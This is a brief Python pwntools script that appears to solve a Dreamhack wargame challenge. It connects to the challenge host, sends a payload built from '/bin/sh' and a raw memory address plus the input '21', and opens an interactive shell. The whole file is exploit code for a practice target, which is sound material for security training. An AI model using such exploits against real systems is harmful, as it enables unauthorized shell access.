from pwn import *

p = remote("host3.dreamhack.games", 20551)

payload = b'/bin/sh' + b'\xac\xa0\x04\x08'

p.sendline(payload)
p.sendline(b'21')

p.interactive()